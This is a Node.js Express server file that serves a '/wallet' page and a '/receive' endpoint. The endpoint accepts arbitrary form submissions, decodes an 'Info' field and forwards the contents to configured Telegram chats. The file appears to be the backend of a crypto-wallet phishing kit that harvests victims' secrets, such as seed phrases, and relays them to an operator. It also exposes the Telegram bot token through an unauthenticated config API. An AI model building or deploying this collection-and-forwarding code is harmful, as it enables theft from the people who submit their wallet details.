const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const config = require('./config');

const app = express();
const PORT = config.server.port;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Config page at /
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'config.html'));
});

app.get('/wallet', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'wallet.html'));
});

// API: Get config
app.get('/api/config', (req, res) => {
    res.json({
        telegram: {
            botToken: config.telegram.botToken,
            chatIds: config.telegram.chatIds
        },
        features: {
            telegramNotifications: config.features.telegramNotifications
        }
    });
});

// API: Update config
app.post('/api/config', (req, res) => {
    const { botToken, chatIds, telegramNotifications } = req.body;

    if (botToken !== undefined) config.telegram.botToken = String(botToken).trim();
    if (chatIds !== undefined) {
        config.telegram.chatIds = Array.isArray(chatIds)
            ? chatIds.map(id => String(id).trim()).filter(id => id)
            : String(chatIds).split(',').map(id => id.trim()).filter(id => id);
    }
    if (telegramNotifications !== undefined) {
        config.features.telegramNotifications = Boolean(telegramNotifications);
    }

    config.save();
    res.json({ success: true, message: 'Configuration saved' });
});

let submissions = [];

app.post('/receive', async (req, res) => {
    const rawBody = req.body;
    if (!rawBody || Object.keys(rawBody).length === 0) {
        return res.status(400).json({ success: false, error: 'Empty submission' });
    }

    let parsedInfo = null;
    if (rawBody.Info && typeof rawBody.Info === 'string') {
        try {
            const params = new URLSearchParams(rawBody.Info);
            parsedInfo = Object.fromEntries(params);
        } catch (e) {
            parsedInfo = rawBody.Info;
        }
    }

    const submission = {
        id: Date.now(),
        received: rawBody,
        ...(parsedInfo && { decoded: parsedInfo }),
        timestamp: new Date().toISOString()
    };
    submissions.push(submission);

    if (config.features.telegramNotifications && config.telegram.botToken && config.telegram.chatIds.length > 0) {
        const payload = JSON.stringify(parsedInfo || rawBody, null, 2);
        const telegramText = `📬 *New Submission*\n\n\`\`\`\n${payload.slice(0, 3500)}\n\`\`\`\n\n🕐 ${submission.timestamp}`;
        const telegramUrl = `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`;

        const sendPromises = config.telegram.chatIds.map(async (chatId) => {
            try {
                const tgResponse = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: telegramText, parse_mode: 'Markdown' })
                });
                const tgData = await tgResponse.json();
                if (!tgData.ok) console.error(`TG error for ${chatId}:`, tgData);
            } catch (err) {
                console.error(`TG failed for ${chatId}:`, err);
            }
        });
        Promise.all(sendPromises).catch(() => {});
    }

    res.status(200).json({ success: true, id: submission.id, message: 'Submission received' });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Telegram notifications: ${config.features.telegramNotifications}`);
    if (config.features.telegramNotifications) {
        console.log(`Broadcasting to ${config.telegram.chatIds.length} chat(s)`);
    }
});